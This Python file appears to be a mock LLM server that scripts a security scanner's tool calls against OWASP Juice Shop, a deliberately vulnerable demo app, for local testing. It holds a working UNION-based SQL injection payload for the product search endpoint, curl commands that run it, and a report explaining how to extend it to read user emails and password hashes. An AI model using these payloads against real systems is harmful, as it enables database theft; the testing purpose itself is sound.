#!/usr/bin/env python3
"""Minimal OpenAI-compatible (streaming) mock LLM server for Strix local-backend
testing, scripted for OWASP Juice Shop (a third-party, intentionally vulnerable
demo app -- docker run -d -p 3000:3000 bkimminich/juice-shop) instead of this
repo's own sqli-lab. Same protocol as mock_llm_server.py (reply "OK" to the
connectivity preflight, run one real read-only shell command to reconfirm an
ALREADY HAND-CONFIRMED finding, call create_vulnerability_report with that
real evidence, then call finish_scan) -- only the scripted recon command and
report content differ.

The finding scripted here (UNION-based SQLi via the product search, dumping
the full SQLite schema including the Users table's column names) was
confirmed BY HAND first, not guessed: see security-scan/sqli-lab-coverage.ja.md
("SQLi以外: Open Redirect..." section and the ③UNIONベース entry) for the
real curl session this is based on (2026-11-27). This script does not
discover anything new -- like mock_llm_server.py, it only exercises the real
exec_command / create_vulnerability_report / finish_scan tool-calling
machinery against a real target, with a fixed, pre-written script standing
in for the LLM's own reasoning.

Run standalone (NOT wired into local_scan_server.py's /scan/strix, which is
still hardcoded to sqli-lab -- see strix-local-poc/README.md's note on
mock_llm_server_deserialize.py / mock_llm_server_chain.py for the same
"separate variant, run by hand" pattern):

    # terminal 1 (WSL2, where Strix's local backend runs):
    python3 security-scan/strix-local-poc/mock_llm_server_juiceshop.py 8899

    # terminal 2:
    export STRIX_RUNTIME_BACKEND=local
    export STRIX_LLM="openai/mock-model"
    export OPENAI_API_BASE="http://127.0.0.1:8899/v1"
    export OPENAI_API_KEY="dummy-mock-key"
    mkdir -p /tmp/strix-juiceshop-target && cd /tmp/strix-juiceshop-target
    uv run --project <STRIX_LOCAL_DIR> strix -n -t ./ --scan-mode quick --max-budget 10

Target defaults to 127.0.0.1:3000 (Juice Shop's default port). Requires
Juice Shop to already be running there (WSL2's mirrored networking reaches
a Windows-side Docker container the same way it already did for sqli-lab;
see security-scan/strix-local-poc/windows-wsl-ollama-setup.md).
"""
import json
import os
import sys
import tempfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

STATE_DIR = os.path.join(tempfile.gettempdir(), "mock_llm_juiceshop")
LOG_PATH = os.path.join(STATE_DIR, "requests.jsonl")
TARGET_FILE = os.path.join(STATE_DIR, "target.txt")
state = {"n": 0}

# host:port。第2引数で上書き可(既定: Juice Shopの既定ポート3000。sqli-labの5000ではない)。
TARGET = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1:3000"

_UNION_PAYLOAD = (
    "')) UNION SELECT sql,'2','3','4','5','6','7','8','9','10' FROM sqlite_master--"
)


def current_target():
    try:
        with open(TARGET_FILE, encoding="utf-8") as f:
            t = f.read().strip()
        return t or TARGET
    except OSError:
        return TARGET


def recon_cmd(target):
    return (
        "curl -sS -G 'http://" + target + "/rest/products/search' "
        "--data-urlencode \"q=" + _UNION_PAYLOAD + "\""
    )


def poc_script_code(target):
    return (
        "curl -sS -G 'http://" + target + "/rest/products/search' "
        "--data-urlencode \"q=')) UNION SELECT 1,2,3,4,5,6,7,8,9--\"\n"
        "# -> 500, SQLITE_ERROR: SELECTs to the left and right of UNION do not have\n"
        "#    the same number of result columns  (column count is wrong: 9)\n\n"
        "curl -sS -G 'http://" + target + "/rest/products/search' "
        "--data-urlencode \"q=')) UNION SELECT 1,2,3,4,5,6,7,8,9,10--\"\n"
        "# -> 200, normal product-list JSON (column count 10 is correct)\n\n"
        "curl -sS -G 'http://" + target + "/rest/products/search' "
        "--data-urlencode \"q=" + _UNION_PAYLOAD + "\"\n"
        "# -> 200, product-list JSON with full sqlite_master schema text mixed in,\n"
        "#    including: CREATE TABLE `Users` (... `email` VARCHAR(255) UNIQUE,\n"
        "#    `password` VARCHAR(255), `role` VARCHAR(255), `totpSecret` VARCHAR(255), ...)"
    )


RECON_CMD = recon_cmd(TARGET)

REPORT_ARGS = {
    "title": "SQL Injection (UNION-based) Full Database Schema Disclosure via Product Search",
    "description": (
        "The product search endpoint (`/rest/products/search?q=`) builds its "
        "SQL query by interpolating the `q` parameter directly into a LIKE "
        "clause, with no parameterization. An attacker can close the "
        "surrounding quote/parentheses and append a `UNION SELECT` to read "
        "arbitrary data from any table, including the full schema of every "
        "table in the database via SQLite's `sqlite_master` table."
    ),
    "target": "OWASP Juice Shop (bkimminich/juice-shop), /rest/products/search endpoint",
    "endpoint": "/rest/products/search",
    "method": "GET",
    "impact": (
        "Any unauthenticated user can read the full database schema "
        "(table and column names for every table, including `Users`: "
        "`email`, `password`, `role`, `deluxeToken`, `totpSecret`, and "
        "others), and -- by substituting real column names for the probe's "
        "placeholder literals in the same UNION -- could go on to read "
        "actual row data (e.g. all users' email addresses and password "
        "hashes) from any table, not only Products."
    ),
    "technical_analysis": (
        "The query behind `/rest/products/search` is wrapped in extra "
        "grouping (`((... ) AND deletedAt IS NULL)`), so the injected "
        "string needs `'))` to close it before a `UNION SELECT` will parse "
        "(a lone `'` alone was tried first and did not break the query -- "
        "it is absorbed harmlessly). The UNION's column count must also "
        "match the original SELECT's; probing 1..15 columns found that 9 "
        "fails with 'SELECTs to the left and right of UNION do not have "
        "the same number of result columns' while 10 succeeds. With the "
        "correct closing syntax and column count established, replacing "
        "one of the UNION's placeholder columns with `sql` and selecting "
        "`FROM sqlite_master` returns every table's `CREATE TABLE` "
        "statement, mixed into the normal product-list JSON response."
    ),
    "poc_description": (
        "1. Send `q=')) UNION SELECT 1,2,3,4,5,6,7,8,9--` -- returns HTTP "
        "500 with a SQLite error naming a column-count mismatch (9 is "
        "wrong).\n"
        "2. Increase the column count; `q=')) UNION SELECT "
        "1,2,...,10--` (10 columns) returns HTTP 200 with normal-looking "
        "product-list JSON (no error) -- the column count and closing "
        "syntax are now confirmed correct.\n"
        "3. Send `q=" + _UNION_PAYLOAD + "` -- the response's `data` array now "
        "includes extra entries whose `id` field holds the full "
        "`CREATE TABLE ...` statement for every table (Products, Users, "
        "Baskets, Addresses, and others), instead of a product."
    ),
    "poc_script_code": poc_script_code(TARGET),
    "remediation_steps": (
        "Replace the raw-interpolated search query with a parameterized "
        "query (e.g. Sequelize's bound replacements/placeholders) so user "
        "input is always treated as data, never as SQL syntax. Do not "
        "return raw database error messages (e.g. SQLite error text) to "
        "the client."
    ),
    "evidence": (
        "Exploit request: GET /rest/products/search?q=" + _UNION_PAYLOAD.replace(" ", "%20") + " -> "
        "HTTP 200, response `data` array includes an entry with "
        "`\"id\":\"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, "
        "`username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, "
        "`password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', "
        "`deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) "
        "DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT "
        "'/assets/public/images/uploads/default.svg', `totpSecret` "
        "VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, "
        "`createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, "
        "`deletedAt` DATETIME)\"`, among entries for every other table "
        "(Addresses, BasketItems, Baskets, Captchas, Cards, "
        "ChallengeDependencies, Challenges, Complaints, Deliveries, "
        "Feedbacks, Hints, ImageCaptchas, Memories, PrivacyRequests, "
        "Products, Quantities, Recycles, SecurityAnswers, "
        "SecurityQuestions, Wallets).\n"
        "Baseline (column-count probe): GET /rest/products/search?"
        "q=')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 500, "
        "'Error: SQLITE_ERROR: SELECTs to the left and right of UNION do "
        "not have the same number of result columns'."
    ),
    "assumptions": (
        "None required -- reproduced directly against the running "
        "container with no assumptions about hidden state. The column "
        "count (10) and closing syntax ('))) were both found empirically "
        "by probing, not assumed from source."
    ),
    "counterevidence": (
        "Checked that a lone `'` (no closing parentheses) does not already "
        "break the query (it returns a normal, empty-looking result "
        "instead of an error), confirming the `'))` closing syntax -- not "
        "just any quote -- is what is actually required, and ruling out "
        "that the column-mismatch error seen during probing was caused by "
        "something other than the UNION's column count."
    ),
    "confidence": "high",
    "severity_change_conditions": (
        "Would be lower if this endpoint required authentication; it does "
        "not -- it was reproduced as an anonymous, unauthenticated request."
    ),
    "fix_effort": "low",
    "cvss_breakdown": {
        "attack_vector": "N",
        "attack_complexity": "L",
        "privileges_required": "N",
        "user_interaction": "N",
        "scope": "U",
        "confidentiality": "H",
        "integrity": "N",
        "availability": "N",
    },
    "cwe": "CWE-89",
    "code_locations": [],
}

FINISH_ARGS = {
    "executive_summary": (
        "One finding was confirmed and filed: a UNION-based SQL injection "
        "in the product search endpoint, reproduced live against the "
        "running Juice Shop container, disclosing the full database "
        "schema including the Users table's column names. No real LLM "
        "reasoning was used -- this run is a scripted mock that "
        "re-confirms an already hand-confirmed finding and exercises the "
        "real create_vulnerability_report/finish_scan tools against a "
        "real third-party target."
    ),
    "methodology": (
        "Scripted mock LLM: ran one read-only HTTP request against "
        "/rest/products/search to reconfirm the known UNION-based SQLi "
        "(column count and closing syntax established by hand beforehand), "
        "filed it via create_vulnerability_report with real request/"
        "response evidence, then ended the scan."
    ),
    "technical_analysis": "See the filed vulnerability report for details.",
    "recommendations": "See the filed vulnerability report's remediation steps.",
}


def sse_chunk(w, obj):
    data = ("data: " + json.dumps(obj) + "\n\n").encode()
    w.write(("%x\r\n" % len(data)).encode() + data + b"\r\n")
    w.flush()


def sse_raw(w, raw_bytes):
    w.write(("%x\r\n" % len(raw_bytes)).encode() + raw_bytes + b"\r\n")
    w.flush()


def sse_end(w):
    w.write(b"0\r\n\r\n")
    w.flush()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_POST(self):
        length = int(self.headers.get("content-length", 0))
        body = self.rfile.read(length)
        try:
            req = json.loads(body)
        except Exception:
            req = {"_raw": body.decode(errors="replace")}

        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(json.dumps(req, ensure_ascii=False) + "\n")

        state["n"] += 1
        n = state["n"]
        tools = req.get("tools", [])
        last_user = ""
        for m in reversed(req.get("messages", [])):
            if m.get("role") == "user":
                c = m.get("content")
                last_user = c if isinstance(c, str) else json.dumps(c)
                break
        sys.stderr.write(f"\n=== turn {n}: {len(tools)} tools; last user msg: {last_user[:200]!r} ===\n")

        if not req.get("stream"):
            resp = {
                "id": f"chatcmpl-mock-{n}", "object": "chat.completion", "created": 0,
                "model": req.get("model", "mock-model"),
                "choices": [{
                    "index": 0,
                    "message": {"role": "assistant", "content": "OK"},
                    "finish_reason": "stop",
                }],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
            }
            payload = json.dumps(resp).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Transfer-Encoding", "chunked")
        self.end_headers()

        base = {"id": f"chatcmpl-mock-{n}", "object": "chat.completion.chunk", "created": 0,
                "model": req.get("model", "mock-model")}

        if not tools:
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {"role": "assistant", "content": "OK"}, "finish_reason": None}]})
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}]})
        else:
            with open(LOG_PATH, encoding="utf-8") as f:
                real_turns_seen = sum(1 for line in f if json.loads(line).get("tools"))
            target = current_target()
            if real_turns_seen <= 1:
                name, args = "exec_command", {"cmd": recon_cmd(target)}
            elif real_turns_seen == 2:
                name, args = "create_vulnerability_report", dict(REPORT_ARGS, poc_script_code=poc_script_code(target))
            else:
                name, args = "finish_scan", FINISH_ARGS
            sys.stderr.write(f"    -> scripted call: {name}({args})\n")

            call_id = f"call_mock_{n}"
            sse_chunk(self.wfile, {**base, "choices": [{
                "index": 0,
                "delta": {"role": "assistant", "tool_calls": [{
                    "index": 0, "id": call_id, "type": "function",
                    "function": {"name": name, "arguments": ""},
                }]},
                "finish_reason": None,
            }]})
            sse_chunk(self.wfile, {**base, "choices": [{
                "index": 0,
                "delta": {"tool_calls": [{"index": 0, "function": {"arguments": json.dumps(args)}}]},
                "finish_reason": None,
            }]})
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})

        sse_raw(self.wfile, b"data: [DONE]\n\n")
        sse_end(self.wfile)


if __name__ == "__main__":
    os.makedirs(STATE_DIR, exist_ok=True)
    open(LOG_PATH, "w", encoding="utf-8").close()
    with open(TARGET_FILE, "w", encoding="utf-8") as f:
        f.write(TARGET)
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    srv = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    sys.stderr.write(f"mock LLM server (Juice Shop script) listening on 127.0.0.1:{port}, target={TARGET}\n")
    srv.serve_forever()
